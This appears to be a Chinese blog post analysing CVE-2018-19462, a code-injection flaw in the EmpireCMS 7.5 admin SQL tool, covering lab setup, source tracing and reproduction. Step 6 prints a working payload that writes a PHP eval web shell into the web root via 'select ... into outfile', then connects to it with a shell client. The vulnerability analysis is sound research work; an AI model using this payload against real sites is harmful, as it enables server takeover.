# 帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462) - 雨中落叶 - 博客园

> 原文：[https://www.cnblogs.com/yuzly/p/11353929.html](https://www.cnblogs.com/yuzly/p/11353929.html)

帝国CMS(EmpireCMS) v7.5 代码注入分析(CVE-2018-19462)

**一、漏洞描述**

EmpireCMS7.5及之前版本中的admindbDoSql.php文件存在代码注入漏洞。该漏洞源于外部输入数据构造代码段的过程中,网路系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞生成非法的代码段,修改网络系统或组件的预期的执行控制流。

**二、影响版本**

EmpireCMS<=7.5

**三、环境搭建**

1、官方下载EmpireCMS V7.5 下载地址:http://www.phome.net/download/

2、把下载的文件中的upload下的所有目录和文件放入到网站根目录下

3、修改php.ini配置文件, PHP环境中必须开启短标签,不然安装会提示无法安装

　　![](../Images/5b2343e5386a7553e1c6227fd86cc7d0.png)

4、设置php.ini中 short_open_tag = On,重启phpstudy

　　![](../Images/fa3de02268a5043c52ae12ea5199b8a9.png)

5、然后开始安装,安装过程参考: https://jingyan.baidu.com/article/48b37f8dcc014b1a6564887c.html

**四、漏洞复现**

1、漏洞出现的页面如下

　　![](../Images/4dcbdd694759535a1c5938dcfe939a22.png)

2、分析源码定位漏洞出现的位置在/e/admin/db/DoSql.php,浏览代码,对sqltext使用RepSqlTbpre函数进行处理

　　![](../Images/c04e9a3166c06ea7069b79e45383944c.png)

3、跟进RepSqlTbpre函数,发现仅仅对表的前缀做替换,没有做其他任何处理

　　![](../Images/dafca95db0b82b1b315f3a5917dd6683.png)

4、继续浏览代码,发现对$query使用DoRunQuery函数进行处理

　　![](../Images/1385e8d843c3da984e7b55e669679df8.png)

5、跟进DoRunQuery函数,可以看到对$sql参数只做了去除空格、以”;”分隔然后遍历,并你没有做别的限制和过滤,导致可以执行恶意的sql语句

　　![](../Images/4354b7b6e3f4e794c44d6a10f3033a55.png)

6、登录后台,点击如下,输入一段写shell的payload,payload内容如下:

select '<?php @eval($_POST[1])?>' into outfile 'C:/phpStudy/WWW/empirecms/shell.php'

　　![](../Images/0eae7ef36852df9f00cbed15b81373b7.png)

7、点击”执行SQL”,提示错误,是由于mysql安全限制的原因

　　![](../Images/a11fa2b2664a6ee76226fa2aba9744a2.png)

8、修改mysql的配置文件, 在[mysqld] 下添加条目: secure_file_priv =,保存之后,然后重启mysql

　　![](../Images/d9b5f0b9ea9013318986b3df6bd5e0ba.png)

9、再次执行SQL语句,可以看到成功执行SQL语句

　　![](../Images/2b8e8355cd34fb64a27afbbd46ff9980.png)

10、查看是否成功上传shell

　　![](../Images/bb9475dd9ae96c982b799cec10c18d00.png)

11、菜刀连接,成功getshell

　　![](../Images/0fa5cd32f2cf742e5391fece2c28da5c.png)

-------------------------------------------------------------------------------------------------------------

参考: [http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201906-306](http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-201906-306)

     [https://github.com/novysodope/empireCMS7.5/blob/master/getshell](https://github.com/novysodope/empireCMS7.5/blob/master/getshell)